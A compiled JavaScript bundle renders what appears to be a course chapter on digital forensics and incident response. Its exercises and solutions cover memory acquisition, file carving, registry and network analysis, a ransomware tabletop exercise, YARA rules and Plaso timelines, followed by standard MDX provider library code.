    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\n1) Recently accessed files (MRU lists, UserAssist). 2) USB device history (USBSTOR, Portable Devices). 3) User account information (SAM hive — usernames, last login, failed login count). Also: network shares (Network), installed programs (Uninstall), shell bags (BagMRU — folder view settings that reveal directory browsing history).\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "5",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "What is the chain of custody and why is it legally critical?"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nChain of custody documents every person who handled evidence, when, why, and what changes were made. It must show: who collected, who secured, who analyzed, and who stored the evidence — with timestamps and signatures. Legally critical because without it, evidence can be challenged as tampered or inadmissible in court. \"If it wasn't documented, it didn't happen.\"\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "6",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Explain the difference between NIST SP 800-61 and SANS PICERL incident response frameworks."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nNIST SP 800-61: Preparation → Detection & Analysis → Containment/Eradication/Recovery → Post-Incident Activity. SANS PICERL: Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned. The key differences: NIST combines containment/eradication/recovery as one phase; SANS separates them. NIST emphasizes detection/analysis more; SANS is more operational with clear phase gates.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "practical-exercises",
      children: "Practical Exercises"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Memory Acquisition:"
        }), " Use FTK Imager or Belkasoft to acquire a memory dump from a test Windows machine. Verify the integrity of the dump using SHA-256 hashing. Document the process step by step."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nSteps: 1) Download and run FTK Imager (as admin). 2) File → Capture Memory → select output directory and filename (e.g., memdump.mem). 3) Include pagefile.sys if available. 4) Click \"Capture Memory\" and wait. 5) After acquisition, verify integrity: `Get-FileHash memdump.mem -Algorithm SHA256`. 6) Store the hash separately. 7) Document: date/time, system info, tool version, hash value, chain of custody.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "2",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "File Carving:"
        }), " Download a sample raw disk image from CFReDS (Digital Forensic Research Repository). Use foremost or scalpel to recover deleted files. Categorize recovered files by type (JPEG, PDF, DOCX, ZIP)."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\n`foremost -t jpeg,pdf,doc,zip -i disk_image.raw -o output/`. This searches the raw image for file headers (JPEG: FFD8, PDF: 25504446, ZIP: 504B0304) and carves files based on headers and footers. Categorize by extension in the output directory. Scalpel uses a config file (scalpel.conf) with header/footer patterns for more control.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "3",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Windows Registry Analysis:"
        }), " Use RegRipper or autopsy to analyze a Windows registry hive. Extract:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Recently accessed files (MRU lists)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "USB device history"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "User account information"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Installed programs list"
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nUse RegRipper: `rip.exe -r NTUSER.DAT -f mru` for recently accessed files. `rip.exe -r SYSTEM -f usb` for USB history. `rip.exe -r SAM -f sam` for user accounts. `rip.exe -r SOFTWARE -f uninstall` for installed programs. RegRipper outputs a timeline/text report with extracted evidence for each hive.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "4",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Network Forensic Analysis:"
        }), " Capture network traffic during a simulated attack (use your lab from Chapter 1). Use Wireshark and Zeek to:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Identify the attacker's IP address"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Extract downloaded files from HTTP streams"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Create a timeline of network events"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Identify C2 beaconing patterns"
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nIdentify attacker IP: sort by destination IP, look for unusual outbound connections or scan patterns. Extract files: File → Export Objects → HTTP → select and save files. Timeline: Statistics → Flow Graph → TCP. C2 beaconing: look for periodic small packets at regular intervals (e.g., every 60s GET /, similar packet size). Alternatively, run Zeek: `zeek -r capture.pcap` → analyze conn.log for beaconing patterns (conn.log columns: ts, duration, orig_bytes, resp_bytes).\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "5",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Incident Response Tabletop Exercise:"
        }), " Design a ransomware incident scenario. Write injects for each phase (Preparation → Detection → Containment → Eradication → Recovery → Post-Mortem). Include decision points and expected actions for each role."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nInject 1 (Detection): SOC email alert — multiple file rename events on file server. Decision: Is this a true positive? Roles: SOC analyst triages, confirms ransomware. Inject 2 (Containment): Isolate affected server from network, preserve memory. Decision: Disconnect host or isolate on switch? Roles: IR lead decides containment strategy, IT executes. Inject 3 (Eradication): Identify patient zero, scan all systems for persistence. Inject 4 (Recovery): Restore from offline backups. Inject 5 (Post-Mortem): Root cause analysis, update playbook.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "challenge-problems",
      children: "Challenge Problems"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Full Forensic Investigation:"
        }), " Create a forensic image of a simulated compromised system (use a deliberately vulnerable VM). Conduct a complete investigation:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Identify the initial compromise vector"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Trace the attacker's actions (timeline)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Recover deleted evidence"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Identify data exfiltrated"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Write a complete forensic report suitable for court"
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nCreate image: `dd if=/dev/sda of=image.dd bs=4M`. Use Plaso for timeline: `log2timeline --storage timeline.plaso image.dd`, then `psort -o l2tcsv timeline.plaso > timeline.csv`. Use foremost for file carving. Use Volatility for memory analysis (if RAM acquired). Verify compromise vector via log analysis (auth.log, access.log). Reconstruct timeline with Plaso timeline. Write report: executive summary, methodology, findings (screenshots), timeline, chain of custody, tools used, conclusions.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "2",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "YARA Rule Development:"
        }), " Analyze 5 real malware samples (from MalwareBazaar). Create custom YARA rules that detect each sample based on:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Strings (unique patterns)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "File metadata (PE sections, compile time)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Behavioral indicators (imports, resources)\nTest your rules against clean files to confirm no false positives."
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nUse pestudio/pecheck to analyze PE structure. Identify unique strings, import table (e.g., CryptEncrypt, CreateRemoteThread), section names (e.g., .upack, .UPX0), compile timestamps. Write YARA rule with meta, strings, and condition sections. Test: `yara -r rule.yar /clean/samples/` — aim for 0 false positives. Test: `yara -r rule.yar /malware/samples/` — confirm detection.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "3",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Timeline Analysis:"
        }), " Use Plaso (log2timeline) to create a super timeline from a forensic image. Use psort to filter by event type. Identify:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "When the compromise occurred"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "What files were accessed after compromise"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "What network connections were made"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "What registry keys were modified\nCreate a visual timeline in Kibana or Timeline Explorer."
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\n`log2timeline --storage timeline.plaso image.dd`, then `psort -o l2tcsv -q timeline.plaso > timeline.csv`. Filter by event type: `Select-String \"FILE\" timeline.csv` or `Select-String \"REG\" timeline.csv`. Look for anomalous events around compromise time. For Kibana: convert to JSON and import. Create visual timeline: x-axis = timestamp, y-axis = event type, color = severity. Key markers: first malicious file creation, registry Run key modification, outbound connection to unknown IP.\n"]
    })]
  });
}
function MDXContent(props = {}) {
  const {wrapper: MDXLayout} = {
    ...(0,lib/* useMDXComponents */.R)(),
    ...props.components
  };
  return MDXLayout ? (0,jsx_runtime.jsx)(MDXLayout, {
    ...props,
    children: (0,jsx_runtime.jsx)(_createMdxContent, {
      ...props
    })
  }) : _createMdxContent(props);
}



/***/ },

/***/ 28453
(__unused_webpack___webpack_module__, __webpack_exports__, __webpack_require__) {

/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   R: () => (/* binding */ useMDXComponents),
/* harmony export */   x: () => (/* binding */ MDXProvider)
/* harmony export */ });
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(96540);
/**
 * @import {MDXComponents} from 'mdx/types.js'
 * @import {Component, ReactElement, ReactNode} from 'react'
 */

/**
 * @callback MergeComponents
 *   Custom merge function.
 * @param {Readonly<MDXComponents>} currentComponents
 *   Current components from the context.
 * @returns {MDXComponents}
 *   Additional components.
 *
 * @typedef Props
 *   Configuration for `MDXProvider`.
 * @property {ReactNode | null | undefined} [children]
 *   Children (optional).
 * @property {Readonly<MDXComponents> | MergeComponents | null | undefined} [components]
 *   Additional components to use or a function that creates them (optional).
 * @property {boolean | null | undefined} [disableParentContext=false]
 *   Turn off outer component context (default: `false`).
 */



/** @type {Readonly<MDXComponents>} */
const emptyComponents = {}

const MDXContext = react__WEBPACK_IMPORTED_MODULE_0__.createContext(emptyComponents)

/**
 * Get current components from the MDX Context.
 *
 * @param {Readonly<MDXComponents> | MergeComponents | null | undefined} [components]
 *   Additional components to use or a function that creates them (optional).
 * @returns {MDXComponents}
 *   Current components.
 */
function useMDXComponents(components) {
  const contextComponents = react__WEBPACK_IMPORTED_MODULE_0__.useContext(MDXContext)

  // Memoize to avoid unnecessary top-level context changes
  return react__WEBPACK_IMPORTED_MODULE_0__.useMemo(
    function () {
      // Custom merge via a function prop
      if (typeof components === 'function') {
        return components(contextComponents)
      }

      return {...contextComponents, ...components}
    },
    [contextComponents, components]
  )
}

/**
 * Provider for MDX context.
 *
 * @param {Readonly<Props>} properties
 *   Properties.
 * @returns {ReactElement}
 *   Element.
 * @satisfies {Component}
 */
function MDXProvider(properties) {
  /** @type {Readonly<MDXComponents>} */
  let allComponents

  if (properties.disableParentContext) {
    allComponents =
      typeof properties.components === 'function'
        ? properties.components(emptyComponents)
        : properties.components || emptyComponents
  } else {
    allComponents = useMDXComponents(properties.components)
  }

  return react__WEBPACK_IMPORTED_MODULE_0__.createElement(
    MDXContext.Provider,
    {value: allComponents},
    properties.children
  )
}


/***/ }

}]);